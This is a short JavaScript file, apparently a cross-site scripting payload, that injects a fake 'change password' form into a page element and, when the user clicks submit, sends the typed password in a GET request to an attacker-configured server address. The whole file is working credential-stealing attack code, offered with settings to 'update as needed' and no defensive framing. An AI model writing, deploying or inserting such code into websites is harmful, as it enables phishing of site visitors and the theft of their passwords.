/**
 *  appendForm
 *
 *  Append a 'change password' form to the page and send captured credentials
 * to a controlled web server
 */

/**
 * update these as needed
 */
const appendFormToID = 'bio';
const ipAddress = '127.0.0.1';

// get reference to existing dom element
const domElement = document.getElementById(appendFormToID);

// create and append a form
const form = domElement.appendChild(document.createElement('form'));

// create and append an input to the form
const currentPwdInput = document.createElement('input');
currentPwdInput.type = 'currentPwd';
currentPwdInput.name = 'currentPwd';
currentPwdInput.id = 'currentPwd';
form.appendChild(document.createTextNode('Current Password: '));
form.appendChild(currentPwdInput);

// create and append a submit button
submitButton = document.createElement('input');
submitButton.type = 'submit';
submitButton.value = 'Change Password';

// handler for submit botton event
submitButton.onclick = function() {
    // construct the target url
    const url = `http://${ipAddress}/password=`;
    const password = document.getElementById('currentPwd').value;
    // send payload
    const xmlHttp = new XMLHttpRequest();
    xmlHttp.open('GET', url + password, true);
    xmlHttp.send();
};

form.appendChild(submitButton);
